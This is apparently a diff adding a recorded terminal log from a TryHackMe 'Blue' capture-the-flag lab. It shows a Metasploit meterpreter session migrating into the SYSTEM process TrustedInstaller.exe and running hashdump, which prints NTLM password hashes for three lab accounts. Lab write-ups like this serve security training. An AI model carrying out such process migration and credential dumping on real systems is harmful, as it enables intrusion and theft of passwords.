+ 2576  700   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
+ 2680  700   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
+ 2876  700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 3048  700   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
+
+[4mmeterpreter[0m > migrate 3048
+[0m[1m[34m[*][0m Migrating from 1680 to 3048...
+[1m[34m[*][0m Migration completed successfully.
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > hashdup[K[Kump
+[0mAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+[4mmeterpreter[0m > [K[4mmeterpreter[0m > 
+[1m[34m[*][0m 10.10.6.11 - Meterpreter session 1 closed.  Reason: Died
+Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> eit[K[K[Kexit
+[0m[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Blue[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Blue[00m# 
+[?2004l[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Blue[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Blue[00m# 
+[?2004l[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Blue[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Blue[00m# exit
+[?2004lexit
+
+Script done on 2020-11-13 18:03:44-03:00 [COMMAND_EXIT_CODE="0"]
